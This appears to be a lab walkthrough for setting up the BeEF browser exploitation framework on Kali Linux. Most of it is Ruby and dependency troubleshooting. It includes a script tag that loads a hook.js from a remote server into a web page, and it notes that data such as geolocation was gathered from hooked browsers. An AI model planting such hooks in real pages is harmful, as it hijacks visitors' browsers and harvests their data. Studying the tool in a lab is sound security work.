# BeEF Lab Walkthrough

## What is BeEF?

BeEF (Browser Exploitation Framework) is a tool that lets you test how browsers can be exploited. Instead of just checking network security, it focuses on the browser itself as an entry point. Basically, it hooks browsers and lets you run commands or gather info directly from them.

I used BeEF to see what kind of data I could collect from a hooked browser and how it connects back to the server.  

For more info: [Introducing BeEF](https://github.com/beefproject/beef/wiki/Introducing-BeEF)

---

## Prepping KaliVM
I started by adding the missing Kali archive key, then did a full update so the VM had fresh package lists.

```bash
sudo wget https://archive.kali.org/archive-keyring.gpg -O /usr/share/keyrings/kali-archive-keyring.gpg
sudo apt update && sudo apt upgrade -y
```

## Setting Up BeEF

I worked on Linux for this lab since it’s officially supported. Here’s what I did step by step.

### Tried installing beef directly from the repo (led to dependency issues)
At first I tried using the package version of beef, which triggered Ruby and SQLite dependency errors.

```bash
sudo apt install beef-xss -y
sudo apt install libsqlite3-dev -y
sudo gem install sqlite -v '1.4.2' --source 'https://rubygems.org/'
sudo gem install sqlite3
sudo gem install bundler
```
I also attempted to run bundle inside the packaged beef folder:

```bash
cd /usr/share/beef-xss
bundle
bundle install
sudo bundle install
```

Various (unsuccessful) attempts to fix frozen or locked bundle configs:

```bash
bundle config unset frozen
sudo bundle config unset frozen
bundle config unset deployment
bundle lock
sudo bundle lock
bundle install
sudo gem install msgpack
sudo gem install rake -v 13.3.1
sudo gem install rake
```

### 2. Cloned Beef manually instead (cleaner route)
I grabbed the source directly from GitHub and started fresh.

```bash
cd ~
git clone https://github.com/beefproject/beef
cd beef
sudo apt update
sudo apt install ruby ruby-dev build-essential libsqlite3-dev libssl-dev libxml2-dev libxslt1-dev zlib1g-dev -y
```

Tried running it:

```bash
./beef
sudo gem install bundler
bundle install
./beef
```

Still had Ruby version problems.

### 3. Installed rbenv and built proper Ruby versions
At this point, I installed rbenv so I could build a Ruby version that Beef actually supports.

```bash
sudo apt install -y build-essential libssl-dev libreadline-dev zlib1g-dev
git clone https://github.com/rbenv/rbenv.git ~/.rbenv
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(rbenv init - bash)"' >> ~/.bashrc
source ~/.bashrc
git clone https://github.com/rbenv/ruby-build.git ~/.rbenv/plugins/ruby-build
```

Built Ruby versions until one worked cleanly:

```bash
rbenv install 3.2.2
rbenv global 3.2.2
ruby -v
```

Set the paths again just to be sure:

```bash
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(rbenv init - bash)"' >> ~/.bashrc
source ~/.bashrc
```

Also updated Zsh since the VM switched shells:

```bash
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.zshrc
echo 'eval "$(rbenv init - zsh)"' >> ~/.zshrc
source ~/.zshrc
```

Checked Ruby:

```bash
which ruby
ruby -v
```

### 5. Installed bundler and dependencies using rbenv Ruby
Then I reinstalled Bundler under the correct Ruby environment and installed Beef’s dependencies properly.

```bash
cd ~/beef
gem install bundler
bundle install
```

Eventually, I moved to a newer Ruby version for compatibility:

```bash
rbenv install 3.4.7
rbenv local 3.4.7
rbenv global 3.4.7
rbenv rehash
gem install bundler
bundle install
```

## 6. Launched Beef and edited the config
Finally, after fixing all version issues, Beef launched successfully.

```bash
./beef
```

Edited config while testing:

```bash
nano ~/beef/config.yaml
./beef
```

Checked network info:

```bash
ip a
```

## Hooking a Browser

BeEF creates a script called `hook.js` that you include on a webpage. Once someone opens that page, their browser shows up as “hooked” in the BeEF dashboard.

Here’s what I did:

```html
<script src="http://123.123.123.123:3000/hook.js"></script>
```

After loading the page, I could see the hooked browser in the dashboard.

---

## Web Server Settings

I also checked `config.yaml` to see how the web server was set up. Here’s the main section I used:

```yaml
http:
    debug: false
    host: "0.0.0.0"
    port: "3000"

    public:
        host: "example.com"
        port: "3000"
        https: false

    dns: "localhost"
    hook_file: "/hook.js"
    hook_session_name: "BEEFHOOK"
    session_cookie_name: "BEEFSESSION"
```

I didn’t change much, just made sure the host and port were correct so the hook worked.

---

## Screenshots

Here are the main things I saw during the lab:

```markdown
![Browser Info](images/browserInfo.png)
![Geolocation](images/geolocation.png)
![Hooked Browser](images/hooked.png)
![Logs](images/logs.png)
![Man in the Browser](images/MitB.png)
![Topology](images/topology.png)
```
